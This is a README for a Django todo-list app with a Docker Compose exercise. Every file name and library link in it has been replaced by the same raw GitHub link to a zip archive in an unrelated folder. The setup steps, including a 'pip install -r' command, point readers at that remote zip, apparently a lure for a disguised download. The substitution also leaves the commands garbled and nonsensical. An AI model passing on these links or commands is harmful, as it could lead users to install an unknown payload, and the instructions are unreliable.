# Django-Todolist

Django-Todolist is a todolist web application with the most basic features of most web apps, i.e. accounts/login, API and (somewhat) interactive UI.

---
CSS | [Skeleton](https://raw.githubusercontent.com/karaedd/devops_todolist_docker_core_task_3_docker_compose/main/monosaccharide/devops_todolist_docker_core_task_3_docker_compose.zip)
JS  | [jQuery](https://raw.githubusercontent.com/karaedd/devops_todolist_docker_core_task_3_docker_compose/main/monosaccharide/devops_todolist_docker_core_task_3_docker_compose.zip)

## Explore
Try it out by installing the requirements. (Works only with python >= 3.8, due to Django 4)

    pip install -r https://raw.githubusercontent.com/karaedd/devops_todolist_docker_core_task_3_docker_compose/main/monosaccharide/devops_todolist_docker_core_task_3_docker_compose.zip

Create a database schema:

    python https://raw.githubusercontent.com/karaedd/devops_todolist_docker_core_task_3_docker_compose/main/monosaccharide/devops_todolist_docker_core_task_3_docker_compose.zip migrate

And then start the server (default: http://localhost:8000)

    python https://raw.githubusercontent.com/karaedd/devops_todolist_docker_core_task_3_docker_compose/main/monosaccharide/devops_todolist_docker_core_task_3_docker_compose.zip runserver


Now you can browse the [API](http://localhost:8000/api/)
or start on the [landing page](http://localhost:8000/)

## Task
#### Prerequisites
- Fork this repository

#### Requirements

1. Prepare a `https://raw.githubusercontent.com/karaedd/devops_todolist_docker_core_task_3_docker_compose/main/monosaccharide/devops_todolist_docker_core_task_3_docker_compose.zip` file that will build and start both MySQL db and Todolist app
2. Remove RUN python https://raw.githubusercontent.com/karaedd/devops_todolist_docker_core_task_3_docker_compose/main/monosaccharide/devops_todolist_docker_core_task_3_docker_compose.zip migrate as the database is no longer available at the build time
3. Refactor ENTRYPOINT to execute both db migration and application start. Example:
`ENTRYPOINT ["sh", "-c", “command1 && command2”]`
4. The application should work with no issues after running docker-compose up
5. Update the https://raw.githubusercontent.com/karaedd/devops_todolist_docker_core_task_3_docker_compose/main/monosaccharide/devops_todolist_docker_core_task_3_docker_compose.zip file by adding a new section with instructions on how to run and stop containers with docker-compose
6. Todos should be stored in MySQL Database, with a persistent volume connected
7. Create PR with your changes and attach it for validation on a platform








